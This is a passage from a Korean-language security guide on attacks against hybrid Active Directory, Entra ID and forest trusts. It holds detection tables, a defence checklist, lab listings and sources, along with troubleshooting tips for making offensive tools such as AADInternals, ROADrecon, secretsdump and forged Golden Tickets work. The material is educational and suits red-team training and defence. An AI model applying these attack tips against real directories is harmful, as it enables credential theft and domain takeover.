| keytab 외부 호스트에서 사용 | DC 4769 | **머신 계정 TGS 요청이 해당 머신의 IP가 아닌 다른 IP**에서 발생 |
| 비정상 kinit | `/var/log/krb5kdc.log` | 같은 principal의 비정상 지역 요청 |
| SSSD 캐시 접근 | `/var/log/audit/audit.log`(auditd) | `/var/lib/sss/db/`에 **root 아닌** 접근 |
| Samba AD DCSync | Samba 로그(`/var/log/samba/`) | `DsReplicaSync` 호출 패턴 |

### 3.8 출처(Linux + AD)

- Red Hat — [Integrating RHEL with Microsoft AD using SSSD](https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/8/html/integrating_rhel_systems_directly_with_windows_active_directory/)
- MIT Kerberos — [Configuration keytab](https://web.mit.edu/kerberos/krb5-latest/doc/admin/host_config.html)
- Samba Team — [Samba AD DC 문서](https://wiki.samba.org/index.php/Setting_up_Samba_as_an_Active_Directory_Domain_Controller), [Samba Security History](https://www.samba.org/samba/history/security.html)
- Fortra — [Impacket keytab/ticketer/getTGT](https://github.com/fortra/impacket)
- Fedora Project — [SSSD 문서](https://sssd.io/docs)

---

## 4. JEA · AdminSDHolder · 보호된 그룹 상호작용

**Just Enough Administration(JEA)**는 PowerShell 원격을 **제한된 함수 셋 + 제한된
로그인 역할 계정**으로 돌리는 Windows 기능입니다. 하이브리드·트러스트 공격 측면에서
JEA가 관여하는 지점:

1. **관리자용 PAW → 운영 서버**로 가는 경로가 JEA 엔드포인트로 통일되면 **대규모
   원격 관리에서 평문·토큰 노출을 줄이는 효과**가 큽니다.
2. JEA 엔드포인트가 사용하는 가상 계정·gMSA에는 필요한 리소스 권한만 주며,
   Domain Admins 같은 **보호된 그룹 멤버십을 편의상 부여하지 않습니다**. JEA는
   명령 표면을 줄이는 통제이고 Protected Users·AdminSDHolder는 별도 축입니다.
3. 레드팀 관점에서 JEA 엔드포인트는 **"호출 가능한 cmdlet"이 좁지만 그 cmdlet가
   종종 특권 작업을 수행**합니다. `Get-PSSessionConfiguration`과
   `Get-PSSessionCapability -ConfigurationName <name>` 으로 매핑합니다.

**AdminSDHolder 상호작용**: SDProp은 대략 60분 주기로 `AdminSDHolder` 객체의 보안
설명자를 보호된 사용자·그룹 객체에 다시 찍습니다. **보호 그룹 객체에 ACE 하나를
추가한다고 그 ACE가 모든 멤버에게 전파되는 것은 아닙니다.** 지속성을 노리는 공격은
`CN=AdminSDHolder,CN=System,...` 자체의 DACL을 바꾸는 것이며, Entra Connect 계정을
보호 그룹에 넣는 구성은 동기화 기능에 불필요한 Tier-0 권한을 더할 뿐입니다. 자세한 ACE 모니터는
[[AD 심화 — ACL 권한 체인과 DCSync 완성|ACL 글]] §12를 참조하세요.

---

## 5. 공통 오류와 흔한 함정

| 상황 | 흔한 오류 | 원인/해결 |
|---|---|---|
| Entra Connect LocalDB 읽기 실패 | `Access denied` | 로컬 관리자 아님 또는 EDR이 LocalDB 접근 차단 — 호스트 로컬 어드민 재확인 |
| AADInternals의 Seamless SSO 토큰 생성 거부 | `Invalid audience` | 테넌트 ID/도메인 불일치 — `Get-AADIntTenantID`로 재확인 |
| 포레스트 Golden Ticket이 통과 안 함 | `KDC_ERR_POLICY` | SID 필터링 활성 — 설정상 공격 성립 불가 |
| krbtgt 2회 리셋 중 사용자 로그온 실패 | `KRB_AP_ERR_MODIFIED` 다량 | 일시적 — Microsoft 스크립트의 **첫 리셋 후 10시간 대기** 지침 미준수 |
| Linux가 AD에 못 조인 | DNS/시간 동기화 | `chronyd` + DC NTP, `resolv.conf` DC 지정 |
| ROADrecon 수집 실패 | 토큰이 너무 좁은 스코프 | `roadtx interactiveauth` 로 범위 넓은 토큰 재발급 |
| secretsdump가 Samba AD에 안 됨 | 서비스 바인딩 이슈 | `--target-ip` 명시, Samba 버전 호환성 확인 |

---

## 6. 하이브리드·트러스트 방어 체크리스트

- [ ] Entra Connect 서버는 **Tier-0**로 분류, PAW 전용, EDR 상시.
- [ ] MSOL·Sync 계정 로테이션 주기(90일 이하) 자동화.
- [ ] Seamless SSO 사용 중이면 **AZUREADSSOACC$ Kerberos 키 30일 로테이션**.
- [ ] 모든 하이브리드 사용자에 **MFA + Conditional Access**.
- [ ] Device Code Flow 조건부 접근으로 **차단 또는 차단-예외 명시**.
- [ ] 포레스트 트러스트 **SID 필터링 활성** (`netdom trust /EnableSidHistory:no`).
- [ ] `krbtgt` **2회 리셋 스크립트** 주기 실행 (자식·부모 모두).
- [ ] 외부 트러스트는 **쿼런틴 모드(`/Quarantine:yes`)**.
- [ ] Linux keytab **0600**, 애플리케이션 keytab 분리 및 소유자 전용.
- [ ] Samba AD **최신 패치** 유지, `secrets.tdb` 접근 통제.
- [ ] Entra ID Sign-in·Audit 로그 → SIEM, Entra ID Protection 활성.
- [ ] 보호된 그룹·AdminSDHolder 변경 알림, Entra 역할 변경 알림.

---

## 7. 실습 환경 (공개 랩)

| 환경 | 다루는 기법 | 비고 |
|---|---|---|
| [GOAD](https://github.com/Orange-Cyberdefense/GOAD) — 사이트2(두 번째 포레스트) | 포레스트 트러스트, 자식→부모 체인 | 완전판 GOAD에서 두 번째 포레스트가 포함됨 |
| [GOAD-Light](https://github.com/Orange-Cyberdefense/GOAD) | 축소판, intra-forest 자식 도메인 | — |
| [HTB — Multimaster](https://www.hackthebox.com/machines/Multimaster) | 트러스트 + SQLi → AD | 은퇴 머신 |
| [HTB — Forest](https://www.hackthebox.com/machines/Forest) | AS-REP → ACL → DCSync (단일 포레스트 체인 기반) | 은퇴 머신 |
| [HTB — Resolute](https://www.hackthebox.com/machines/Resolute) | AD 사용자 피벗 + DnsAdmins | 은퇴 머신 |
| [HTB — Fuse](https://www.hackthebox.com/machines/Fuse) | 프린터 로그 노출 → 사용자 패스워드 추측 | 은퇴 머신, 소규모 랩 |
| [Microsoft Learn — Identity 학습 경로](https://learn.microsoft.com/en-us/training/paths/implement-manage-identity-access/) | Entra 개념·구성 절차 | **호스팅 Learn Sandbox는 2026년 현재 종료**([공식 FAQ](https://learn.microsoft.com/en-us/training/support/faq?pivots=sandbox)); 개인 구독 필요 |
| [Microsoft Entra Free 개발 테넌트](https://learn.microsoft.com/en-us/entra/verified-id/how-to-create-a-free-developer-account) | 본인 소유 테넌트에서 ROADrecon 데모 | Free tier 또는 자격이 되는 M365 개발 샌드박스 사용 |
| [ROADrecon](https://github.com/dirkjanm/ROADtools) | `roadrecon auth/gather/gui` 데모 | 공개 데모 테넌트가 아닌 **자기 테넌트·승인된 계정**만 사용 |
| [Microsoft 365 Developer Program](https://developer.microsoft.com/en-us/microsoft-365/dev-program) | 샘플 사용자·메일박스가 있는 개발 테넌트 | 자격 요건·레거시 샌드박스 종료 정책 확인 |

트러스트 공격은 **반드시 롤백 가능한 상태로** 수행하세요. 랩에서도 `sIDHistory`
삽입, krbtgt 변경, AZUREADSSOACC$ 로테이션은 **성공 후 반드시 원복**합니다. Entra
테넌트 상 변경은 **삭제·복구에 시간이 걸릴 수 있으므로** 변경 전 **테넌트 전수
속성 백업**(`roadrecon gather`)을 확보하세요.

---

## 8. 다음 단계로 이어지는 공격

- **ACL → 하이브리드로**: [[AD 심화 — ACL 권한 체인과 DCSync 완성|ACL 글]] §12의
  DCSync + Entra Connect MSOL 계정 조합은 **온프레 DCSync → 테넌트 전역**으로
  바로 연결됩니다. ACE 감사 포인트에 **MSOL·Sync_\* 계정**을 반드시 포함시키세요.
- **Kerberos → 트러스트로**: [[AD 심화 — Kerberos 티켓 위조와 위임 공격 완성|Kerberos
  글]] §4의 Golden Ticket에 **SID History/Extra SIDs**를 더하면 인트라-포레스트
  경계가 사실상 사라집니다. "자식 도메인은 보안 경계가 아니다"가 실무 원칙.
- **AD CS → 포레스트로**: [[AD 심화 — AD CS 인증서 공격 전수 정리|AD CS 글]] §3의
  ESC 공격은 **한 포레스트의 CA가 다른 포레스트에 신뢰되는 Enterprise CA**인 경우
  상대 포레스트 서비스/사용자용 인증서까지 발급 가능합니다.
- **내부 서버 → Entra로**: [[AD 심화 — 내부 서버 공격(SCCM·MSSQL·WSUS·Exchange)|내부
  서버 글]]의 Exchange 온프레는 Entra Connect와 **같은 조직 계정**을 공유하는 경우가
  많아, 온프레 Exchange 침해 후 조건부 접근이 약하면 **클라우드 Exchange Online 메일박스**에도
  영향이 전파됩니다.
- **연쇄 체인 끝에서 — 사후 지속성**: 하이브리드의 사후 지속성은 ① Entra 애플리케이션
  권한 추가 ② 포레스트 트러스트 유지 ③ Linux keytab 보존 등 **온프레 밖**에서도
  수립됩니다. 사후 복구는 `onprem-only` 비밀번호 전수 교체만으로 끝나지 않습니다.

---

- 출처 모음: [Microsoft Learn — Microsoft Entra Connect Sync 계정과 권한](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/reference-connect-accounts-permissions), [Microsoft Learn — Hybrid Identity 디자인](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/plan-hybrid-identity-design-considerations-overview), [Microsoft Learn — Security considerations for trusts](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/security-considerations-for-trusts), [Microsoft krbtgt reset script](https://github.com/microsoft/New-KrbtgtKeys.ps1), [Microsoft Learn — AD DS 감사 범주](https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/advanced-security-audit-policy-settings), [Will Schroeder & Lee Chagolla-Christensen — An ACE Up The Sleeve](https://posts.specterops.io/an-ace-up-the-sleeve-designing-active-directory-dacl-backdoors-5c7fd3f7f38), [harmj0y — Trustpocalypse](https://blog.harmj0y.net/redteaming/domain-trusts-were-not-done-yet/), [adsecurity.org — Trust/Golden Ticket](https://adsecurity.org/?p=1588), [Nestori Syynimaa — AADInternals](https://github.com/Gerenios/AADInternals), [aadinternals.com](https://aadinternals.com), [dirkjanm — ROADtools](https://github.com/dirkjanm/ROADtools), [dirkjanm 블로그 — Entra ID](https://dirkjanm.io/), [CyberArk — Golden SAML](https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps), [CyberArk — PTA 가로채기](https://www.cyberark.com/resources/threat-research-blog/azure-active-directory-pass-through-authentication-flaws), [dafthack — GraphRunner](https://github.com/dafthack/GraphRunner), [Fox-IT — adconnectdump](https://github.com/fox-it/adconnectdump), [mimikatz Wiki](https://github.com/gentilkiwi/mimikatz/wiki), [Impacket](https://github.com/fortra/impacket), [Red Hat — SSSD/AD 통합](https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/8/html/integrating_rhel_systems_directly_with_windows_active_directory/), [Samba AD DC 공식 Wiki](https://wiki.samba.org/index.php/Setting_up_Samba_as_an_Active_Directory_Domain_Controller)
